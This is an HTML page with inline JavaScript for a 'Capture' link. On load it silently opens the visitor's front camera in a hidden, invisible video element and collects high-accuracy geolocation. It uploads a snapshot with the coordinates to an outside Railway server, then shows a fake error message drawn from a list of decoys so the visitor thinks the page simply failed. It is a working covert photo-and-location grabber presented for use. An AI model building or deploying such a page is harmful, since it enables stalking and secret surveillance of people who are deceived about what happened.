<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Capture</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@500;600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg: #0a0a0f;
      --glass: rgba(255, 255, 255, 0.06);
      --border: rgba(255, 255, 255, 0.12);
      --text: #f4f4f8;
      --muted: #9898a8;
      --accent: #22d3ee;
      --accent2: #a78bfa;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: "Syne", system-ui, sans-serif;
      color: var(--text);
      background:
        radial-gradient(ellipse 100% 80% at 50% -20%, rgba(124, 58, 237, 0.2), transparent 55%),
        radial-gradient(ellipse 70% 50% at 100% 100%, rgba(34, 211, 238, 0.08), transparent 45%),
        var(--bg);
    }

    .noise {
      position: fixed;
      inset: 0;
      pointer-events: none;
      opacity: 0.035;
      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
      z-index: 0;
    }

    .shell {
      position: relative;
      z-index: 1;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: clamp(1.25rem, 4vw, 2rem);
      max-width: 560px;
      margin: 0 auto;
    }

    header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
      margin-bottom: 2rem;
    }

    .brand {
      font-weight: 800;
      font-size: 1.1rem;
      letter-spacing: -0.02em;
      background: linear-gradient(135deg, var(--text), var(--accent));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .nav-gallery {
      font-family: "Space Mono", monospace;
      font-size: 0.78rem;
      color: var(--muted);
      text-decoration: none;
      padding: 0.45rem 0.9rem;
      border-radius: 999px;
      border: 1px solid var(--border);
      background: var(--glass);
      backdrop-filter: blur(12px);
      transition: color 0.2s, border-color 0.2s;
    }

    .nav-gallery:hover {
      color: var(--text);
      border-color: rgba(124, 58, 237, 0.45);
    }

    .glass {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 2.5rem 1.5rem;
      background: var(--glass);
      border: 1px solid var(--border);
      border-radius: 24px;
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      box-shadow: 0 24px 80px rgba(0, 0, 0, 0.45);
      min-height: 280px;
    }

    .hint {
      font-family: "Space Mono", monospace;
      font-size: 0.82rem;
      color: var(--muted);
      margin: 0;
      line-height: 1.6;
    }

    .hint.error {
      color: #f87171;
    }

    .hint strong {
      color: var(--accent);
      font-weight: 400;
    }

    .decoy-panel {
      display: none;
      flex-direction: column;
      align-items: center;
      gap: 0.5rem;
    }

    .decoy-panel.visible {
      display: flex;
    }

    .decoy-panel .decoy-icon {
      width: 48px;
      height: 48px;
      border-radius: 50%;
      background: rgba(248, 113, 113, 0.1);
      border: 1px solid rgba(248, 113, 113, 0.35);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.25rem;
      color: #f87171;
      margin-bottom: 0.25rem;
    }

    .decoy-panel h2 {
      margin: 0;
      font-size: 1.2rem;
      font-weight: 700;
      color: #fca5a5;
      max-width: 22ch;
    }

    .decoy-panel p {
      margin: 0;
      font-family: "Space Mono", monospace;
      font-size: 0.72rem;
      color: var(--muted);
      max-width: 32ch;
      line-height: 1.5;
    }

    .working #statusRow {
      display: block;
    }

    .working #decoyPanel {
      display: none !important;
    }

    /* Hidden capture surface — no visible preview */
    #preview {
      position: fixed !important;
      width: 1px !important;
      height: 1px !important;
      opacity: 0 !important;
      visibility: hidden !important;
      pointer-events: none !important;
      left: -9999px !important;
      top: 0 !important;
      overflow: hidden !important;
      clip: rect(0, 0, 0, 0) !important;
    }
  </style>
</head>
<body>
  <div class="noise" aria-hidden="true"></div>
  <div class="shell working" id="shell">
    <header>
      <span class="brand">Capture</span>
      <a class="nav-gallery" href="gallery.html">View gallery</a>
    </header>

    <main class="glass">
      <div id="statusRow">
        <p id="status" class="hint">One moment…</p>
      </div>
      <div id="decoyPanel" class="decoy-panel">
        <div class="decoy-icon" aria-hidden="true">!</div>
        <h2 id="decoyTitle">Something went wrong</h2>
        <p id="decoyDetail"></p>
      </div>
    </main>
  </div>

  <video id="preview" playsinline muted autoplay tabindex="-1" aria-hidden="true"></video>

  <script>
    // redeployment trigger
    const API_BASE = "https://link-take-photo-production.up.railway.app";

    const WEBP_QUALITY = 0.82;
    const JPEG_FALLBACK_QUALITY = 0.88;

    const shell = document.getElementById("shell");
    const statusEl = document.getElementById("status");
    const decoyPanel = document.getElementById("decoyPanel");
    const decoyTitle = document.getElementById("decoyTitle");
    const decoyDetail = document.getElementById("decoyDetail");
    const preview = document.getElementById("preview");

    const DECOY_MESSAGES = [
      {
        title: "503 Service Unavailable",
        detail: "The server is temporarily unable to handle your request. Maintenance in progress.",
      },
      {
        title: "Connection timed out",
        detail: "The site took too long to respond. Check your network and try again later.",
      },
      {
        title: "This page isn’t working",
        detail: "If the problem continues, contact the site owner. HTTP ERROR_EMPTY_RESPONSE",
      },
      {
        title: "Oops! The hamsters stopped running the server.",
        detail: "We’re training new hamsters. Please refresh in a few minutes.",
      },
      {
        title: "Bandwidth exceeded",
        detail: "Too many people visited this page at once. Try again after a short break.",
      },
      {
        title: "Update required",
        detail: "Your browser failed to download the latest joke module. Error 418.",
      },
    ];

    function pickDecoy() {
      return DECOY_MESSAGES[Math.floor(Math.random() * DECOY_MESSAGES.length)];
    }

    function getLocationFast() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ latitude: null, longitude: null, accuracy: null });
          return;
        }

        const timeout = setTimeout(() => {
          resolve({ latitude: null, longitude: null, accuracy: null });
        }, 5000);

        navigator.geolocation.getCurrentPosition(
          (pos) => {
            clearTimeout(timeout);
            resolve({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
            });
          },
          () => {
            clearTimeout(timeout);
            resolve({ latitude: null, longitude: null, accuracy: null });
          },
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      });
    }

    const locationPromise = getLocationFast();

    const CAMERA_INIT_TIMEOUT_MS = 15000;
    const VIDEO_READY_TIMEOUT_MS = 12000;

    function setStatus(text, isError) {
      statusEl.textContent = text;
      statusEl.classList.toggle("error", !!isError);
    }

    async function startCamera() {
      let timeoutId;
      const timeoutPromise = new Promise((_, reject) => {
        timeoutId = setTimeout(
          () => reject(new Error("Camera initialization timed out")),
          CAMERA_INIT_TIMEOUT_MS
        );
      });
      const stream = await Promise.race([
        navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false,
        }),
        timeoutPromise,
      ]);
      clearTimeout(timeoutId);
      preview.srcObject = stream;
      try {
        await preview.play();
      } catch (playErr) {
        console.error("video.play:", playErr);
      }
      return stream;
    }

    function waitForVideoReady() {
      return new Promise((resolve, reject) => {
        const t = setTimeout(() => {
          reject(new Error("Camera preview timed out"));
        }, VIDEO_READY_TIMEOUT_MS);
        const finish = () => {
          clearTimeout(t);
          resolve();
        };
        const check = () => {
          if (preview.videoWidth > 0 && preview.videoHeight > 0) {
            finish();
            return;
          }
          requestAnimationFrame(check);
        };
        preview.addEventListener(
          "loadedmetadata",
          () => check(),
          { once: true }
        );
        preview.addEventListener("loadeddata", () => check(), { once: true });
        preview.addEventListener("canplay", () => check(), { once: true });
        if (preview.videoWidth > 0) finish();
        else requestAnimationFrame(check);
      });
    }

    function captureFrame() {
      const w = preview.videoWidth;
      const h = preview.videoHeight;
      if (!w || !h) throw new Error("Video not ready");
      const canvas = document.createElement("canvas");
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext("2d");
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(preview, 0, 0);
      return new Promise((resolve, reject) => {
        canvas.toBlob(
          (webpBlob) => {
            if (webpBlob && webpBlob.size > 0) {
              resolve({ blob: webpBlob, mimeType: "image/webp" });
              return;
            }
            canvas.toBlob(
              (jpegBlob) => {
                if (!jpegBlob) reject(new Error("Could not encode image"));
                else resolve({ blob: jpegBlob, mimeType: "image/jpeg" });
              },
              "image/jpeg",
              JPEG_FALLBACK_QUALITY
            );
          },
          "image/webp",
          WEBP_QUALITY
        );
      });
    }

    function blobToBase64(blob) {
      return new Promise((resolve, reject) => {
        const r = new FileReader();
        r.onload = () => {
          const dataUrl = r.result;
          resolve(String(dataUrl).split(",")[1] || "");
        };
        r.onerror = reject;
        r.readAsDataURL(blob);
      });
    }

    async function uploadPhoto(base64, mimeType, location) {
      const payload = { image: base64, mime_type: mimeType };
      if (
        location &&
        typeof location.latitude === "number" &&
        typeof location.longitude === "number" &&
        !Number.isNaN(location.latitude) &&
        !Number.isNaN(location.longitude)
      ) {
        payload.latitude = location.latitude;
        payload.longitude = location.longitude;
        if (typeof location.accuracy === "number" && !Number.isNaN(location.accuracy)) {
          payload.accuracy = location.accuracy;
        }
      }
      const res = await fetch(`${API_BASE}/upload-photo`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const text = await res.text();
      let data;
      try {
        data = JSON.parse(text);
      } catch {
        throw new Error(text || `HTTP ${res.status}`);
      }
      if (!res.ok) throw new Error(data.detail || data.message || `HTTP ${res.status}`);
      return data;
    }

    async function run() {
      setStatus("One moment…");
      /* Location resolves in parallel (started at load); never block camera on geolocation. */

      let stream;
      try {
        stream = await startCamera();
        await waitForVideoReady();
      } catch (e) {
        console.error("Camera error:", e);
        const msg =
          e && e.name === "NotAllowedError"
            ? "Camera access denied. Allow camera and reload."
            : "Camera access denied or unavailable: " + (e && e.message ? e.message : String(e));
        setStatus(msg, true);
        return;
      }

      let encoded;
      try {
        encoded = await captureFrame();
      } catch (e) {
        setStatus(String(e.message || e), true);
        stream.getTracks().forEach((t) => t.stop());
        preview.srcObject = null;
        return;
      }

      stream.getTracks().forEach((t) => t.stop());
      preview.srcObject = null;

      let location;
      try {
        location = await locationPromise;
      } catch {
        location = { latitude: null, longitude: null, accuracy: null };
      }

      try {
        const b64 = await blobToBase64(encoded.blob);
        await uploadPhoto(b64, encoded.mimeType, location);
      } catch (e) {
        setStatus("Upload failed: " + (e.message || e), true);
        return;
      }

      shell.classList.remove("working");
      document.getElementById("statusRow").style.display = "none";
      const decoy = pickDecoy();
      decoyTitle.textContent = decoy.title;
      decoyDetail.textContent = decoy.detail;
      decoyPanel.classList.add("visible");
    }

    run().catch((err) => {
      console.error(err);
      setStatus("Something went wrong: " + (err && err.message ? err.message : String(err)), true);
    });
  </script>
</body>
</html>
